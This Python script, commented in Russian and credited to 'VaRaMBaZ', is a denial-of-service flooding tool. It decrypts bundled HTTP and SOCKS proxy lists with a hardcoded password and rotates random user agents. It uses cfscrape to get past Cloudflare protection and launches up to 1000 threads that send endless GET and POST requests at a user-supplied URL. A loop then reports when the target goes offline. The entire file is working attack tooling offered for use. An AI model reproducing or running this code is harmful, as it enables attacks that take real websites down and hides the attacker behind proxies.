import time
import colorama
import threading
import random
import requests
import cfscrape
import os
import pyAesCrypt
from numba import prange

os.system("clear")

s = cfscrape.create_scraper()

#Получение User-Agent
with open('useragent') as file:
    headersp = ''.join(file.readlines()).strip().split('\n')

#Расшифровка прокси
filedecrypthttp = "proxyhttp.crp"
filedecryptsocks = "proxysocks.crp"
password = "0xdrqdsdwgfegvefgtruoobcdsm"

def decryptionhttp():
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(filedecrypthttp), str(os.path.splitext(filedecrypthttp)[0]), password, buffer_size)
decryptionhttp()

with open('proxyhttp') as file:
    proxy_http = ''.join(file.readlines()).strip().split('\n')
os.remove("proxyhttp")

def decryptionsocks():
    buffer_size = 512 * 1024
    pyAesCrypt.decryptFile(str(filedecryptsocks), str(os.path.splitext(filedecryptsocks)[0]), password, buffer_size)
decryptionsocks()

with open('proxysocks') as file:
    proxy_socks = ''.join(file.readlines()).strip().split('\n')
os.remove("proxysocks")

# Запуск потоков
def dospause1(barrier, url):
    barrier.wait()
    dos1(url)

def dospause2(barrier, url):
    barrier.wait()
    dos2(url)

def dos1(target):
    while True:
        #FakeUserAgent
        useragent = random.choice(headersp)
        useragent2 = random.choice(headersp)
        useragent3 = random.choice(headersp)
        useragent4 = random.choice(headersp)
        useragent5 = random.choice(headersp)

        #RandomProxy
        proxyagenthttp = random.choice(proxy_http)
        proxyagentsocks = random.choice(proxy_socks)
        proxyagenthttp2 = random.choice(proxy_http)
        proxyagentsocks2 = random.choice(proxy_socks)
        proxyagenthttp3 = random.choice(proxy_http)

        #Запросы GET
        try:
            s.get(target, headers={'user-agent': useragent}, proxies={'http': proxyagenthttp, 'https': proxyagenthttp})
        except:
            pass

        try:
            s.get(target, headers={'user-agent': useragent2}, proxies={'http': proxyagentsocks, 'https': proxyagentsocks})
        except:
            pass

        #Запросы POST
        try:
            s.post(target, headers={'user-agent': useragent3}, proxies={'http': proxyagenthttp2, 'https': proxyagenthttp2})
        except:
            pass

        try:
            s.post(target, headers={'user-agent': useragent4}, proxies={'http': proxyagentsocks2, 'https': proxyagentsocks2})
        except:
            pass

def dos2(target):
    while True:
        useragent = random.choice(headersp)
        header = {'user-agent': useragent}
        try:
            requests.get(target, headers=header)
            requests.post(target, headers=header)
        except:
            pass


threads = 20
print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
print("  \\-\      //-/    //-/    \\-\    ||-|     ||-|   ||    |=-|  ||     |-| ||____             ")
print("   \\-\    //-/    //========\\-\   ||=========     ||    |=-|  ||     |-|      || |-|    ")
print("    \\-\  //-/    //-/        \\-\  ||-|     \\-\    ||    |=-|  ||     |-|   ___|| |-|   ")
print("     \\-\//-/    //-/          \\-\ ||-|      \\-\   ||====/-/   \\=====/-/ ||======|-| \n")
print("Creator: VaRaMBaZ")
print("Version: 1.6.6; Fixed bugs \n")


url = input("URL: ")
if not url.__contains__("http"):
    exit(colorama.Fore.RED + "URL doesnt contains http or https!")

if not url.__contains__("."):
    exit(colorama.Fore.RED + "Invalid domain")

try:
    threads = int(input("Threads[max 1000]: "))
except ValueError:
    exit(colorama.Fore.RED + "Threads count is incorrect!")

if threads == 0 or threads > 1000:
    exit(colorama.Fore.RED + "Threads count is incorrect!")

bar = threading.Barrier(threads)
proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
print("")

print(colorama.Fore.YELLOW + "Starting threads...")
if proxyuseage == 1:
    for i in range(0, threads):
        thr = threading.Thread(target=dospause1, args=(bar, url, ))
        thr.start()
else:
    for i in range(0, threads):
        thr2 = threading.Thread(target=dospause2, args=(bar, url, ))
        thr2.start()
print(colorama.Fore.GREEN + "All threads are running!")

while True:
    try:
        checksite = requests.post(url, headers={'user-agent': useragent5},
                                  proxies={'http': proxyagenthttp3, 'https': proxyagenthttp3})
        if checksite.status_code >= 500:
            statustext = "OFF_LINE"
        else:
            statustext = "ON_LINE"
    except:
        pass
    print("\r Check Site | Status: " + str(checksite.status_code) + " | " + str(statustext), end='')
    time.sleep(1)